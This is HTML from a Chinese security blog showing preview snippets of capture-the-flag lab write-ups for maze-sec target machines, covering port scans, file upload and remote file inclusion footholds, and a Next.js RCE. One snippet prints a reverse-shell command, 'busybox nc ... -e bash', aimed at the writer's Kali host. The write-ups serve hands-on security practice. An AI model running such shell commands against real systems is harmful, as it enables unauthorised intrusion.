密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 180端口和22端口，80端口是一个Textpattern CMS，过去看看  80端口探测12345访问一下显示无法访问，发现跳转到了textpattern.dsz 那就把放他到hosts当中sudo vim /etc/hosts192.168.44.153 textpattern.dsz 再次访问,可以正常访问了    nday利用1搜索一下Tex...</div></div></div></a><a class="pagination-related" href="/posts/41646.html" title="群友靶机之Lzh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之Lzh</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334    配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧是22,80端口  目录扫描 1给了个cms的源码,应该是有部署了这一套的cms，尝试访问/mozilo/   立足点12如果是cms，那应该就是打的nday了【之前打的awd倒是很多这种】版本也给了，直接搜发现有个rce的洞   123看了利用方式那就是后台直接upload文件上传，然后在/kategorien/Willkommen/dat...</div></div></div></a><a class="pagination-related" href="/posts/47096.html" title="群友靶机之7r1umph"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之7r1umph</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：12345678910111213靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧是22,80端口  目录扫描 1index.php有一个上传口，/upload和/tmp是可访问文件目录口，/info.php是php的phpinfo，抓包走一遍文件上传逻辑    1文件上传的时候没啥限制，发现上传之后会在upload上但是后缀名加成.dsz,也会出现在/tmp上但是再点击的时候，就显示404，该文件也消失掉了，那思路应该就...</div></div></div></a><a class="pagination-related" href="/posts/34438.html" title="群友靶机之Open"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之Open</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧经典的80端口加22端口，但是这里的80端口显示重定向到open.dsz，正常直接访问是访问不到的，做了个域名映射  80端口探测12sudo vim /etc/hosts192.168.44.139 open.dsz  远程文件包含12正常进来之后提示是一个远程文件包含(RFI)测试工具通过http://open@格式进行URL处理   反弹s...</div></div></div></a><a class="pagination-related" href="/posts/55978.html" title="群友靶机之React"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之React</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 180,22,3000端口，在3000端口看到是nextjs最新的 CVE-2025-66478 rce漏洞  nday1为了方便后期实现就反弹shell到kali上面，busybox nc 192.168.44.128 4444 -e bash   123456789101112131415161718192021222324252627282930...</div></div></div></a><a class="pagination-related" href="/posts/30095.html" title="群友靶机之Monkey"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之Monkey</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：12345678910111213靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧是22,80端口  80端口探索 123进来是一个html，在源代码提示了个域名，依旧放到hosts当中8sudo vim /etc/hosts192.168.44.139 open.dsz  目录扫描 1这里出题人对dirsearch进行了限制，扫不出东西，换成gobuster来试试   tip点切入1234出了两个文件，其实bak.zip...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">陈羽琳</div><div class="author-info-description">每天能不能pwn一点</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cyl-love"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cyl-love" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Love life, always—loveforver in the small.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">配置：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.</span> <span class="toc-text">域名枚举</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.</span> <span class="toc-text">服务探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gifts-victorique-xyz"><span class="toc-number">5.1.</span> <span class="toc-text">gifts.victorique.xyz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#victorique-xyz"><span class="toc-number">5.2.</span> <span class="toc-text">victorique.xyz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ka4zuyaKujo0-victorique-xyz"><span class="toc-number">5.3.</span> <span class="toc-text">Ka4zuyaKujo0.victorique.xyz</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nday%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">nday利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E6%8E%A2%E6%B5%8B"><span class="toc-number">8.</span> <span class="toc-text">再探测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%86%8D%E6%8F%90%E5%8D%87"><span class="toc-number">9.</span> <span class="toc-text">权限再提升</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/47096.html" title="群友靶机之7r1umph">群友靶机之7r1umph</a><time datetime="2025-12-24T13:06:56.000Z" title="发表于 2025-12-24 21:06:56">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/63247.html" title="群友靶机之5ud0">群友靶机之5ud0</a><time datetime="2025-12-24T13:06:46.000Z" title="发表于 2025-12-24 21:06:46">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/34595.html" title="群友靶机之wechat">群友靶机之wechat</a><time datetime="2025-12-24T13:06:38.000Z" title="发表于 2025-12-24 21:06:38">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/60187.html" title="群友靶机之Vimer">群友靶机之Vimer</a><time datetime="2025-12-24T13:06:31.000Z" title="发表于 2025-12-24 21:06:31">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/47936.html" title="群友靶机之victorique">群友靶机之victorique</a><time datetime="2025-12-24T13:06:09.000Z" title="发表于 2025-12-24 21:06:09">2025-12-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/2.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By 陈羽琳</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
